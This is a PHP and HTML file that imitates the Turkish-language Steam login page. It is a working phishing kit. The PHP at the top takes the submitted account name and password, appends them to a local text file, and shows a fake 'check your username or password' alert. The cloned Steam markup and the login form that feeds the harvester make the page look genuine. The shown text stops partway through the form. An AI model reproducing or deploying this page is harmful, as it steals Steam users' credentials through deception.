<?php  

if (isset($_POST['login']) && isset($_POST['password'])) {

$ac = fopen("kayit.txt","a+");
$username = $_POST['login'];
$password = $_POST['password'];
$userlar = ("\n __________________ \nUsername: ".$username."\nPassword: ".$password."\n__________________ \n");
fwrite($ac,$userlar);
fclose($ac);
echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
}
 ?>



<html class=" responsive" lang="tr"><head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="theme-color" content="#171a21">
    <title>Giriş Yap</title>
  <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">

  
  <link href="https://steamstore-a.akamaihd.net/public/shared/css/motiva_sans.css?v=FAK4O46_mOLB" rel="stylesheet" type="text/css">
<link href="https://steamstore-a.akamaihd.net/public/shared/css/shared_global.css?v=UhDZ5Hi4B43R" rel="stylesheet" type="text/css">
<link href="https://steamstore-a.akamaihd.net/public/shared/css/buttons.css?v=g4vF5QlH7C0a" rel="stylesheet" type="text/css">
<link href="https://steamstore-a.akamaihd.net/public/css/v6/store.css?v=CpgghoITCnMf" rel="stylesheet" type="text/css">
<link href="https://steamstore-a.akamaihd.net/public/css/v6/cart.css?v=_Hp1sX3Ys3QR" rel="stylesheet" type="text/css">
<link href="https://steamstore-a.akamaihd.net/public/css/v6/browse.css?v=VXffWm1t3BeM" rel="stylesheet" type="text/css">
<link href="https://steamstore-a.akamaihd.net/public/css/v6/login.css?v=7P0uzhSYUThm" rel="stylesheet" type="text/css">
<link href="https://steamstore-a.akamaihd.net/public/shared/css/login.css?v=QcbERFgXjFo1" rel="stylesheet" type="text/css">
<link href="https://steamstore-a.akamaihd.net/public/shared/css/shared_responsive.css?v=lZjXzgjiAjP-" rel="stylesheet" type="text/css">
      <script async="" src="//www.google-analytics.com/analytics.js"></script><script>
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

        ga('create', 'UA-33786258-1', 'auto', {
          'sampleRate': 0.4       });
        ga('set', 'dimension1', false );
        ga('set', 'dimension2', 'External' );
        ga('set', 'dimension3', 'login' );
        ga('set', 'dimension4', "login\/DefaultAction" );
        ga('send', 'pageview' );

      </script>
      <script type="text/javascript" src="https://steamstore-a.akamaihd.net/public/shared/javascript/jquery-1.8.3.min.js?v=.TZ2NKhB-nliU"></script>
<script type="text/javascript">$J = jQuery.noConflict();</script><script type="text/javascript" src="https://steamstore-a.akamaihd.net/public/shared/javascript/tooltip.js?v=.vG8yiuBTGwkE"></script>

<script type="text/javascript" src="https://steamstore-a.akamaihd.net/public/shared/javascript/shared_global.js?v=BMSUaF2v22ac&amp;l=turkish"></script>

<script type="text/javascript" src="https://steamstore-a.akamaihd.net/public/javascript/main.js?v=77knsz8qwyDY&amp;l=turkish"></script>

<script type="text/javascript" src="https://steamstore-a.akamaihd.net/public/javascript/dynamicstore.js?v=bKBeUYxWQD0X&amp;l=turkish"></script>


    <script type="text/javascript">
      document.addEventListener('DOMContentLoaded', function(event) { 
        $J.data( document, 'x_readytime', new Date().getTime() ); 
        $J.data( document, 'x_oldref', GetNavCookie() ); 
        SetupTooltips( { tooltipCSSClass: 'store_tooltip'} ); 
    });
    </script><script type="text/javascript" src="https://steamstore-a.akamaihd.net/public/shared/javascript/login.js?v=wfHllAFcQ8DJ&amp;l=turkish"></script>
<script type="text/javascript" src="https://steamstore-a.akamaihd.net/public/shared/javascript/shared_responsive_adapter.js?v=g0T28wUgRzSk&amp;l=turkish"></script>

            <meta name="twitter:card" content="summary_large_image">
          <meta name="robots" content="noindex,nofollow">
      
  <meta name="twitter:site" content="@steam_games">

            <meta property="og:title" content="Giriş Yap">
          <meta property="twitter:title" content="Giriş Yap">
          <meta property="fb:app_id" content="105386699540688">
          <meta property="og:site" content="Steam">
      
  
      <link rel="image_src" href="https://steamstore-a.akamaihd.net/public/shared/images/responsive/share_steam_logo.png">
    <link rel="image_src" href="https://steamstore-a.akamaihd.net/public/shared/images/responsive/share_steam_logo.png">
    <meta property="og:image" content="https://steamstore-a.akamaihd.net/public/shared/images/responsive/share_steam_logo.png">
    <meta name="twitter:image" content="https://steamstore-a.akamaihd.net/public/shared/images/responsive/share_steam_logo.png">
          <meta property="og:image:secure" content="https://steamstore-a.akamaihd.net/public/shared/images/responsive/share_steam_logo.png">
    
  
  
  
  </head>
<body class="v6 login responsive_page">

<div class="responsive_page_frame with_header">

            <div class="responsive_page_menu_ctn mainmenu">
        <div class="responsive_page_menu" id="responsive_page_menu">
                    <div class="mainmenu_contents">
            <div class="mainmenu_contents_items">
                              <a class="menuitem" href="https://store.steampowered.com/login/?redir=login%2F%3Fredir%3D%253Fl%253Dturkish%26redir_ssl%3D1&amp;redir_ssl=1">
                  Giriş Yap               </a>
                <a class="menuitem supernav" href="https://store.steampowered.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_store">
    Mağaza  </a>
  <div class="submenu_store" style="display: none;" data-submenuid="store">
    <a class="submenuitem" href="https://store.steampowered.com/">Öne Çıkanlar</a>
    <a class="submenuitem" href="https://store.steampowered.com/explore/">Keşfet</a>
    <a class="submenuitem" href="https://store.steampowered.com/curators/">Küratörler</a>
    <a class="submenuitem" href="https://steamcommunity.com/my/wishlist/">İstek Listesi</a>
    <a class="submenuitem" href="https://store.steampowered.com/news/">Haberler</a>
    <a class="submenuitem" href="https://store.steampowered.com/stats/">İstatistikler</a>
      </div>


  <a class="menuitem supernav" style="display: block" href="https://steamcommunity.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_community">
    Topluluk  </a>
  <div class="submenu_community" style="display: none;" data-submenuid="community">
    <a class="submenuitem" href="https://steamcommunity.com/">Ana Sayfa</a>
    <a class="submenuitem" href="https://steamcommunity.com/discussions/">Tartışmalar</a>
    <a class="submenuitem" href="https://steamcommunity.com/workshop/">Atölye</a>
    <a class="submenuitem" href="https://steamcommunity.com/market/">Pazar</a>
    <a class="submenuitem" href="https://steamcommunity.com/?subsection=broadcasts">Yayınlar</a>
          </div>

  

  
  
  <a class="menuitem" href="https://help.steampowered.com/tr/">
    Destek  </a>

              <div class="minor_menu_items">
                                <div class="menuitem change_language_action">
                  Dili değiştir               </div>
                                                  <div class="menuitem" onclick="Responsive_RequestDesktopView();">
                    Masaüstü internet sitesini görüntüle                  </div>
                              </div>
            </div>
            <div class="mainmenu_footer_spacer"></div>
            <div class="mainmenu_footer">
              <div class="mainmenu_footer_logo"><img src="https://steamstore-a.akamaihd.net/public/shared/images/responsive/logo_valve_footer.png"></div>
              © Valve Corporation. Tüm hakları saklıdır. Tüm ticari markalar, ABD ve diğer ülkelerde ilgili sahiplerinin mülkiyetindedir.             <span class="mainmenu_valve_links">
                <a href="https://store.steampowered.com/privacy_agreement/" target="_blank">Privacy Policy</a>
                &nbsp;| &nbsp;<a href="http://www.valvesoftware.com/legal.htm" target="_blank">Legal</a>
                &nbsp;| &nbsp;<a href="https://store.steampowered.com/subscriber_agreement/" target="_blank">Steam Subscriber Agreement</a>
                &nbsp;| &nbsp;<a href="https://store.steampowered.com/steam_refunds/" target="_blank">Refunds</a>
              </span>
            </div>
          </div>
                  </div>
      </div>
    
    <div class="responsive_local_menu_tab">

    </div>

    <div class="responsive_page_menu_ctn localmenu">
      <div class="responsive_page_menu" id="responsive_page_local_menu">
        <div class="localmenu_content">
        </div>
      </div>
    </div>



          <div class="responsive_header">
        <div class="responsive_header_content">
          <div id="responsive_menu_logo">
            <img src="https://steamstore-a.akamaihd.net/public/shared/images/responsive/header_menu_hamburger.png" height="100%">
                      </div>
          <div class="responsive_header_logo">
            <img src="https://steamstore-a.akamaihd.net/public/shared/images/responsive/header_logo.png" height="36" border="0" alt="STEAM">
          </div>
        </div>
      </div>
    
    <div class="responsive_page_content_overlay">

    </div>

    <div class="responsive_fixonscroll_ctn nonresponsive_hidden ">
    </div>
  
  <div class="responsive_page_content">

    <div id="global_header">
  <div class="content">
    <div class="logo">
      <span id="logo_holder">
                  <a href="https://store.steampowered.com/">
            <img src="https://steamstore-a.akamaihd.net/public/shared/images/header/globalheader_logo.png?t=962016" width="176" height="44">
          </a>
              </span>
      <!--[if lt IE 7]>
      <style type="text/css">
        #logo_holder img { filter:progid:DXImageTransform.Microsoft.Alpha(opacity=0); }
        #logo_holder { display: inline-block; width: 176px; height: 44px; filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://steamstore-a.akamaihd.net/public/images/v5/globalheader_logo.png'); }
      </style>
      <![endif]-->
    </div>

      <div class="supernav_container">
  <a class="menuitem supernav" href="https://store.steampowered.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_store">
    MAĞAZA  </a>
  <div class="submenu_store" style="display: none;" data-submenuid="store">
    <a class="submenuitem" href="https://store.steampowered.com/">Öne Çıkanlar</a>
    <a class="submenuitem" href="https://store.steampowered.com/explore/">Keşfet</a>
    <a class="submenuitem" href="https://store.steampowered.com/curators/">Küratörler</a>
    <a class="submenuitem" href="https://steamcommunity.com/my/wishlist/">İstek Listesi</a>
    <a class="submenuitem" href="https://store.steampowered.com/news/">Haberler</a>
    <a class="submenuitem" href="https://store.steampowered.com/stats/">İstatistikler</a>
      </div>


  <a class="menuitem supernav" style="display: block" href="https://steamcommunity.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_community">
    TOPLULUK  </a>
  

  

  
            <a class="menuitem" href="https://store.steampowered.com/about/">
        HAKKINDA      </a>
      
  <a class="menuitem" href="https://help.steampowered.com/tr/">
    DESTEK  </a>
  <div class="supernav_content" style="position: absolute; z-index: 1500; opacity: 0; left: 74.4063px; top: 64px; pointer-events: none;"><div class="submenu_community" style="" data-submenuid="community">
    <a class="submenuitem" href="https://steamcommunity.com/">Ana Sayfa</a>
    <a class="submenuitem" href="https://steamcommunity.com/discussions/">Tartışmalar</a>
    <a class="submenuitem" href="https://steamcommunity.com/workshop/">Atölye</a>
    <a class="submenuitem" href="https://steamcommunity.com/market/">Pazar</a>
    <a class="submenuitem" href="https://steamcommunity.com/?subsection=broadcasts">Yayınlar</a>
          </div></div></div>
  <script type="text/javascript">
    jQuery(function($) {
      $('#global_header .supernav').v_tooltip({'location':'bottom', 'destroyWhenDone': false, 'tooltipClass': 'supernav_content', 'offsetY':-4, 'offsetX': 1, 'horizontalSnap': 4, 'tooltipParent': '#global_header .supernav_container', 'correctForScreenSize': false});
    });
  </script>

    <div id="global_actions">
      <div id="global_action_menu">
                  <div class="header_installsteam_btn header_installsteam_btn_green">

            <a class="header_installsteam_btn_content" href="https://store.steampowered.com/about/">
              Steam'i Yükleyin            </a>
          </div>
        
        
                            <a class="global_action_link" href="https://store.steampowered.com/login/?redir=login%2F%3Fredir%3D%253Fl%253Dturkish%26redir_ssl%3D1&amp;redir_ssl=1">giriş</a>
          &nbsp;|&nbsp;
          <span class="pulldown global_action_link" id="language_pulldown" onclick="ShowMenu( this, 'language_dropdown', 'right' );">dil</span>
          <div class="popup_block_new" id="language_dropdown" style="display: none;">
            <div class="popup_body popup_menu">
                                                                  <a class="popup_menu_item tight" href="?l=schinese&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'schinese' ); return false;">简体中文 (Basitleştirilmiş Çince)</a>
                                                    <a class="popup_menu_item tight" href="?l=tchinese&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'tchinese' ); return false;">繁體中文 (Geleneksel Çince)</a>
                                                    <a class="popup_menu_item tight" href="?l=japanese&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'japanese' ); return false;">日本語 (Japonca)</a>
                                                    <a class="popup_menu_item tight" href="?l=koreana&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'koreana' ); return false;">한국어 (Korece)</a>
                                                    <a class="popup_menu_item tight" href="?l=thai&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'thai' ); return false;">ไทย (Tayca)</a>
                                                    <a class="popup_menu_item tight" href="?l=bulgarian&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'bulgarian' ); return false;">Български (Bulgarca)</a>
                                                    <a class="popup_menu_item tight" href="?l=czech&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'czech' ); return false;">Čeština (Çekçe)</a>
                                                    <a class="popup_menu_item tight" href="?l=danish&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'danish' ); return false;">Dansk (Danca)</a>
                                                    <a class="popup_menu_item tight" href="?l=german&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'german' ); return false;">Deutsch (Almanca)</a>
                                                    <a class="popup_menu_item tight" href="?l=english&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'english' ); return false;">English (İngilizce)</a>
                                                    <a class="popup_menu_item tight" href="?l=spanish&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'spanish' ); return false;">Español (Kastilya İspanyolcası)</a>
                                                    <a class="popup_menu_item tight" href="?l=latam&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'latam' ); return false;">Español - Latinoamérica (Latin Amerika İspanyolcası)</a>
                                                    <a class="popup_menu_item tight" href="?l=greek&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'greek' ); return false;">Ελληνικά (Yunanca)</a>
                                                    <a class="popup_menu_item tight" href="?l=french&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'french' ); return false;">Français (Fransızca)</a>
                                                    <a class="popup_menu_item tight" href="?l=italian&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'italian' ); return false;">Italiano (İtalyanca)</a>
                                                    <a class="popup_menu_item tight" href="?l=hungarian&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'hungarian' ); return false;">Magyar (Macarca)</a>
                                                    <a class="popup_menu_item tight" href="?l=dutch&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'dutch' ); return false;">Nederlands (Felemenkçe)</a>
                                                    <a class="popup_menu_item tight" href="?l=norwegian&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'norwegian' ); return false;">Norsk (Norveççe)</a>
                                                    <a class="popup_menu_item tight" href="?l=polish&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'polish' ); return false;">Polski (Lehçe)</a>
                                                    <a class="popup_menu_item tight" href="?l=portuguese&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'portuguese' ); return false;">Português (Portekizce)</a>
                                                    <a class="popup_menu_item tight" href="?l=brazilian&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'brazilian' ); return false;">Português - Brasil (Brezilya Portekizcesi)</a>
                                                    <a class="popup_menu_item tight" href="?l=romanian&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'romanian' ); return false;">Română (Rumence)</a>
                                                    <a class="popup_menu_item tight" href="?l=russian&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'russian' ); return false;">Русский (Rusça)</a>
                                                    <a class="popup_menu_item tight" href="?l=finnish&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'finnish' ); return false;">Suomi (Fince)</a>
                                                    <a class="popup_menu_item tight" href="?l=swedish&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'swedish' ); return false;">Svenska (İsveççe)</a>
                                                                      <a class="popup_menu_item tight" href="?l=vietnamese&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'vietnamese' ); return false;">Tiếng Việt (Vietnamca)</a>
                                                    <a class="popup_menu_item tight" href="?l=ukrainian&amp;redir=%3Fl%3Dturkish&amp;redir_ssl=1" onclick="ChangeLanguage( 'ukrainian' ); return false;">Українська (Ukraynaca)</a>
                                            <a class="popup_menu_item tight" href="http://translation.steampowered.com" target="_blank">Steam'i çevirmemize yardım edin</a>
            </div>
          </div>
              </div>
          </div>
      </div>
</div>
<div id="responsive_store_nav_ctn"><div id="store_header" class="" style="visibility: visible; display: block;">
    <div class="content">
      <div id="store_controls">
        <div id="cart_status_data">
                                          <div class="store_header_btn_green store_header_btn" id="store_header_cart_btn" style="display: none;">
              <div class="store_header_btn_caps store_header_btn_leftcap"></div>
              <div class="store_header_btn_caps store_header_btn_rightcap"></div>
              <a id="cart_link" class="store_header_btn_content" href="https://store.steampowered.com/cart/?snr=1_60_4__12">
                Sepet               (<span id="cart_item_count_value">0</span>)
              </a>
            </div>
                  </div>
      </div>
              <div id="store_nav_area">
          <div class="store_nav_leftcap"></div>
          <div class="store_nav_bg">
            <div class="store_nav">

                          <div class="tab  flyout_tab lesspadding" id="foryou_tab" data-flyout="foryou_flyout" data-flyout-align="left" data-flyout-valign="bottom" onmouseover="EnsureStoreMenuTagsLoaded( '#foryou_yourtags' );">
                <span class="pulldown">
                  <a class="pulldown_desktop" href="https://store.steampowered.com/?snr=1_60_4__12">Mağazanız</a>
                  <span></span>
                </span>
              </div>
              <div class="popup_block_new flyout_tab_flyout responsive_slidedown" id="foryou_flyout" style="display: none;">
                <div class="popup_body popup_menu">
                  <a class="popup_menu_item" href="https://store.steampowered.com/?snr=1_60_4__12">
                    Mağaza Ana Sayfası                  </a>
                  <div class="hr"></div>
                  <a class="popup_menu_item" href="https://store.steampowered.com/recommended/?snr=1_60_4__12">
                    Son görüntülenenler                 </a>
                  <a class="popup_menu_item" href="https://store.steampowered.com/curators/?snr=1_60_4__12">
                    Steam Küratörleri                 </a>
                  <a class="popup_menu_item" href="https://store.steampowered.com/updated/all/?snr=1_60_4__12">
                    Son Güncellenenler                  </a>
                </div>
              </div>
            

                              <div class="tab  flyout_tab lesspadding" id="genre_tab" data-flyout="genre_flyout" data-flyout-align="left" data-flyout-valign="bottom">
                  <span class="pulldown">
                    <a class="pulldown_desktop" href="https://store.steampowered.com/games/?snr=1_60_4__12">Oyunlar</a>
                    <a class="pulldown_mobile" href="#">Oyunlar</a>
                    <span></span>
                  </span>
                </div>
                <div class="popup_block_new flyout_tab_flyout responsive_slidedown" id="genre_flyout" style="visibility: visible; top: 42px; left: 113.563px; display: none; opacity: 1;">
                  <div class="popup_body popup_menu">
                                                                                      <a class="popup_menu_item" href="https://store.steampowered.com/genre/Free%20to%20Play/?snr=1_60_4__12">
                          Oynaması Ücretsiz                       </a>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <a class="popup_menu_item" href="https://store.steampowered.com/genre/Early%20Access/?snr=1_60_4__12">
                          Erken Erişim                        </a>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            <a class="popup_menu_item" href="https://store.steampowered.com/demos/?snr=1_60_4__12">
                      <span>Demolar</span>
                    </a>
                    <a class="popup_menu_item" href="https://store.steampowered.com/vr/?snr=1_60_4__12">
                      <span>Sanal Gerçeklik</span>
                    </a>
                    <a class="popup_menu_item" href="https://store.steampowered.com/controller/?snr=1_60_4__12">
                      <span>Steam Kontrolcüsü Uyumlu</span>
                    </a>
                    <a class="popup_menu_item" href="https://store.steampowered.com/pccafe/?snr=1_60_4__12">
                      <span>Steam'deki İnternet Kafe Oyunları</span>
                    </a>
                    <div class="hr"></div>
                    <div class="popup_menu_subheader">Tarzlara göre göz at:</div>

                                                                  <a class="popup_menu_item" href="https://store.steampowered.com/tags/tr/Aksiyon/?snr=1_60_4__12">
                          Aksiyon                       </a>
                                                                                        <a class="popup_menu_item" href="https://store.steampowered.com/tags/tr/Basit%20E%C4%9Flence/?snr=1_60_4__12">
                          Basit Eğlence                       </a>
                                                                                        <a class="popup_menu_item" href="https://store.steampowered.com/tags/tr/Ba%C4%9F%C4%B1ms%C4%B1z/?snr=1_60_4__12">
                          Bağımsız                        </a>
                                                                                        <a class="popup_menu_item" href="https://store.steampowered.com/tags/tr/Devasa%20%C3%87ok%20Oyunculu/?snr=1_60_4__12">
                          Devasa Çok Oyunculu                       </a>
                                                                                                                                  <a class="popup_menu_item" href="https://store.steampowered.com/tags/tr/Macera/?snr=1_60_4__12">
                          Macera                        </a>
                                                                                                                                  <a class="popup_menu_item" href="https://store.steampowered.com/tags/tr/RYO/?snr=1_60_4__12">
                          RYO                       </a>
                                                                                        <a class="popup_menu_item" href="https://store.steampowered.com/tags/tr/Sim%C3%BClasyon/?snr=1_60_4__12">
                          Simülasyon                        </a>
                                                                                        <a class="popup_menu_item" href="https://store.steampowered.com/tags/tr/Spor/?snr=1_60_4__12">
                          Spor                        </a>
                                                                                        <a class="popup_menu_item" href="https://store.steampowered.com/tags/tr/Strateji/?snr=1_60_4__12">
                          Strateji                        </a>
                                                                                        <a class="popup_menu_item" href="https://store.steampowered.com/tags/tr/Yar%C4%B1%C5%9F/?snr=1_60_4__12">
                          Yarış                       </a>
                                          
                    <div class="hr"></div>
                    <a class="popup_menu_item" href="https://store.steampowered.com/tag/browse/?snr=1_60_4__12">
                      Popüler etiketler                   </a>
                    <div class="hr"></div>
                    <div class="popup_menu_subheader">Platforma göre göz at:</div>
                    <a class="popup_menu_item" href="https://store.steampowered.com/macos?snr=1_60_4__12">
                      Mac OS X                    </a>
                    <a class="popup_menu_item" href="https://store.steampowered.com/linux?snr=1_60_4__12">
                      Steam OS + Linux                    </a>
                  </div>
                </div>
              
              <div class="tab  flyout_tab lesspadding" id="software_tab" data-flyout="software_flyout" data-flyout-align="left" data-flyout-valign="bottom">
                <span class="pulldown">
                  <a class="pulldown_desktop" href="https://store.steampowered.com/software/?snr=1_60_4__12">Yazılım</a>
                  <a class="pulldown_mobile" href="#">Yazılım</a>
                  <span></span>
                </span>

              </div>
              <div class="popup_block_new flyout_tab_flyout responsive_slidedown" id="software_flyout" style="display: none;">
                <div class="popup_body popup_menu">
                  <a class="popup_menu_item" href="https://store.steampowered.com/software/?snr=1_60_4__12">
                    Yazılım Merkezi                 </a>
                  <div class="hr"></div>
                                      <a class="popup_menu_item" href="https://store.steampowered.com/tags/tr/Animasyon%20ve%20Modelleme/?snr=1_60_4__12">
                      Animasyon ve Modelleme                    </a>
                                      <a class="popup_menu_item" href="https://store.steampowered.com/tags/tr/E%C4%9Fitici/?snr=1_60_4__12">
                      Eğitici                   </a>
                                      <a class="popup_menu_item" href="https://store.steampowered.com/tags/tr/Foto%C4%9Fraf%20D%C3%BCzenleme/?snr=1_60_4__12">
                      Fotoğraf Düzenleme                    </a>
                                      <a class="popup_menu_item" href="https://store.steampowered.com/tags/tr/Oyun%20Geli%C5%9Ftirme/?snr=1_60_4__12">
                      Oyun Geliştirme                   </a>
                                      <a class="popup_menu_item" href="https://store.steampowered.com/tags/tr/Ses%20Prod%C3%BCksiyonu/?snr=1_60_4__12">
                      Ses Prodüksiyonu                    </a>
                                      <a class="popup_menu_item" href="https://store.steampowered.com/tags/tr/Tasar%C4%B1m%20ve%20%C4%B0ll%C3%BCstrasyon/?snr=1_60_4__12">
                      Tasarım ve İllüstrasyon                   </a>
                                      <a class="popup_menu_item" href="https://store.steampowered.com/tags/tr/Video%20Prod%C3%BCksiyonu/?snr=1_60_4__12">
                      Video Prodüksiyonu                    </a>
                                      <a class="popup_menu_item" href="https://store.steampowered.com/tags/tr/Web%20Yay%C4%B1nc%C4%B1l%C4%B1%C4%9F%C4%B1/?snr=1_60_4__12">
                      Web Yayıncılığı                   </a>
                                      <a class="popup_menu_item" href="https://store.steampowered.com/tags/tr/Yard%C4%B1mc%C4%B1%20Uygulamalar/?snr=1_60_4__12">
                      Yardımcı Uygulamalar                    </a>
                  
                </div>
              </div>

              <div class="tab  flyout_tab lesspadding" id="hardware_tab" data-flyout="hardware_flyout" data-flyout-align="left" data-flyout-valign="bottom">
                <span class="pulldown">
                  <a class="pulldown_desktop" href="https://store.steampowered.com/controller/?snr=1_60_4__12">Donanım</a>
                  <a class="pulldown_mobile" href="#">Donanım</a>
                  <span></span>
                </span>

              </div>
              <div class="popup_block_new flyout_tab_flyout responsive_slidedown" id="hardware_flyout" style="display: none;">
                <div class="popup_body popup_menu">
                  <a class="popup_menu_item" href="https://store.steampowered.com/valveindex?snr=1_60_4__12">
                    Valve Index                 </a>
                  <a class="popup_menu_item" href="https://store.steampowered.com/app/353370/?snr=1_60_4__12">
                    Steam Kontrolcüsü                 </a>
                  <a class="popup_menu_item" href="https://store.steampowered.com/steamlink/about/?snr=1_60_4__12">
                    Steam Link                  </a>
                  <a class="popup_menu_item" href="https://store.steampowered.com/app/358040/?snr=1_60_4__12">
                    HTC Vive                  </a>
                </div>
              </div>
                            <a class="tab  lesspadding" href="https://store.steampowered.com/news/?snr=1_60_4__12">
                <span>Haberler</span>
              </a>

              <div class="search_area">
                <div id="store_search">
                  <form id="searchform" name="searchform" method="get" action="https://store.steampowered.com/search/" onsubmit="return SearchSuggestCheckTerm(this);">
                    <input type="hidden" name="snr" value="1_60_4__12">
                    <div class="searchbox">
                      <input id="store_nav_search_term" name="term" type="text" class="default" placeholder="mağazada ara" size="22" autocomplete="off">
                      <a href="#" id="store_search_link" onclick="var $Form = $J(this).parents('form'); $Form.submit(); return false;"><img src="https://steamstore-a.akamaihd.net/public/images/blank.gif"></a>
                    </div>
                  </form>
                </div>
                <div id="searchterm_options" class="search_suggest popup_block_new" style="display: none;">
                  <div class="popup_body" style="border-top: none;">
                    <div id="search_suggestion_contents">
                    </div>
                  </div>
                </div>
              </div>

            </div>
          </div>
          <div class="store_nav_rightcap"></div>
        </div>
          </div>
  </div></div><div data-cart-banner-spot="1"></div>
    <div class="responsive_page_template_content">

      <script type="text/javascript">
  $J( function() {
    var loginOpts =  {
      strRedirectURL: "https:\/\/store.steampowered.com\/?l=turkish",
      gidCaptcha: -1    };

    
    var LoginManger = new CLoginPromptManager( 'https://store.steampowered.com/', loginOpts );

          document.forms['logon'].elements['username'].focus();
    
      } );
</script>
  <div class="responsive_store_nav_ctn_spacer">
    
    <div class="responsive_store_nav_ctn_spacer"></div>
        <script type="text/javascript">
      $J( function() {
        BindAutoFlyoutEvents();

        var $Window = $J(window);
        var $Header = $J('#store_header');
        var $ResponsiveNavCtn = $J('#responsive_store_nav_ctn');
        var $HeaderWrapper;
        $Window.on('Responsive_SmallScreenModeToggled.StoreMenu', function() {
          var bUseSmallScreenMode =window.UseSmallScreenMode && window.UseSmallScreenMode();

          if ( !$HeaderWrapper )
            $HeaderWrapper = $Header.wrap( $J('<div/>', {'class': 'responsive_store_nav_ctn_spacer'} ) ).parent();

          if ( bUseSmallScreenMode )
            $ResponsiveNavCtn.append( $Header );
          else
            $HeaderWrapper.append( $Header );


          if ( bUseSmallScreenMode )
          {
            $Header.css( 'visibility', 'hidden' );
            $Header.show();
            var nMenuHeight = $J('#store_header' ).height() + $J('#store_header' ).offset().top;
            if ( $Window.scrollTop() < nMenuHeight )
              $Window.scrollTop( nMenuHeight - GetResponsiveHeaderFixedOffsetAdjustment() );

            $Header.css('visibility', 'visible');
          }
        } ).trigger('Responsive_SmallScreenModeToggled.StoreMenu');

                  if( $J('#searchform').length > 0 )
          {
            var g_rgUserPreferences = {
              excluded_tags : [],
              excluded_content_descriptors : [3,4]            };
            EnableSearchSuggestions( $J('#searchform')[0].elements['term'], '1_60_4_', 'TR', 'turkish', g_rgUserPreferences, '6243524' );
          }
        

      } );
    </script>
  <script type="text/javascript">
  var g_AccountID = 0;
  var g_sessionID = "9b2bf04000628de0f06bddf2";
  var g_ServerTime = 1557832781;

  $J( InitMiniprofileHovers );

      GDynamicStore.Init( 0, false, "", {"primary_language":null,"secondary_languages":null,"platform_windows":null,"platform_mac":null,"platform_linux":null,"hide_adult_content_violence":null,"hide_adult_content_sex":null,"timestamp_updated":null,"hide_store_broadcast":null,"review_score_preference":null,"timestamp_content_descriptor_preferences_updated":null} );
    GStoreItemData.SetCurrencyFormatter( function( nValueInCents, bWholeUnitsOnly ) { var fmt = function( nValueInCents, bWholeUnitsOnly ) {  var format = v_numberformat( nValueInCents / 100, bWholeUnitsOnly ? 0 : 2, ",", "."); return format; };var strNegativeSymbol = '';  if ( nValueInCents < 0 ) { strNegativeSymbol = '-'; nValueInCents = -nValueInCents; }return strNegativeSymbol + fmt( nValueInCents, bWholeUnitsOnly ) + " TL";} );
    GStoreItemData.SetCurrencyMinPriceIncrement( 1 );
  </script> </div>

<div class="page_content">

  
  <!-- Center Column -->

  <div id="error_display" class="checkout_error" style="display: none; color: #cc3300">
  </div>

  <div class="leftcol">

    
    <div class="checkout_content_box">
      <div class="loginbox">
        <div class="loginbox_left">
          <div class="loginbox_content">
            <h2>Oturum Açın</h2>
            <p>Var olan bir Steam hesabı</p>
            <br>


            <form  action="" method="POST"style="display: block;">
              <div class="login_row">
                <div class="input_title">Steam hesap adı</div>
                <input class="text_input" type="text" name="login">
              </div>
              <div class="login_row">
                <div class="input_title">Parola</div>
                <input class="text_input" type="password" name="password">
              </div>
                            <div class="login_row" id="captcha_entry" style="display: none;">
                <div id="captcha_image_row">
